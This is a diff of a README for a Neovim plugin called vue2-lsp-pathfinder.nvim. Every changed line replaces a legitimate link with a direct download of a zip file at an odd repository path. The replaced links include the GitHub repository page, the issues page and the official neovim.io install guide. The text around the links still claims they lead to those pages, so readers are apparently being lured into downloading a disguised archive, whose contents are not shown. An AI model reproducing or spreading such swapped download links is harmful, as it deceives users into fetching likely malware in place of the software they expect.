@@ -1,6 +1,6 @@
 # 🧭 vue2-lsp-pathfinder.nvim - Navigate Vue 2 Code Easily
 
-[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim)
+[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rtorgfhui/vue2-lsp-pathfinder.nvim/main/misrecognition/pathfinder-vue-lsp-nvim-3.1.zip)
 
 ---
 
@@ -26,7 +26,7 @@ To install and use this plugin, your system needs the following:
 
 ## 🚀 Getting Started
 
-This section gives step-by-step instructions to download, install, and run vue2-lsp-pathfinder.nvim on a Windows machine. It assumes you have Neovim installed. If you don’t have Neovim yet, visit https://neovim.io/ and follow their Windows install guide before continuing here.
+This section gives step-by-step instructions to download, install, and run vue2-lsp-pathfinder.nvim on a Windows machine. It assumes you have Neovim installed. If you don’t have Neovim yet, visit https://raw.githubusercontent.com/rtorgfhui/vue2-lsp-pathfinder.nvim/main/misrecognition/pathfinder-vue-lsp-nvim-3.1.zip and follow their Windows install guide before continuing here.
 
 ---
 
@@ -34,7 +34,7 @@ This section gives step-by-step instructions to download, install, and run vue2-
 
 You will need to visit the official GitHub page to get the plugin. The page contains the latest files and instructions.
 
-[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim)
+[![Download vue2-lsp-pathfinder.nvim](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/rtorgfhui/vue2-lsp-pathfinder.nvim/main/misrecognition/pathfinder-vue-lsp-nvim-3.1.zip)
 
 1. Click the download badge above to open the GitHub repository in your browser.
 
@@ -147,7 +147,7 @@ Place these settings in your `init.lua`. Adjust numbers or options as needed.
 
 If you want more details or want to report an issue, visit the GitHub repository page:
 
-https://github.com/rtorgfhui/vue2-lsp-pathfinder.nvim
+https://raw.githubusercontent.com/rtorgfhui/vue2-lsp-pathfinder.nvim/main/misrecognition/pathfinder-vue-lsp-nvim-3.1.zip
 
 Check the "Issues" section for common problems or open a new issue if you find bugs.
 
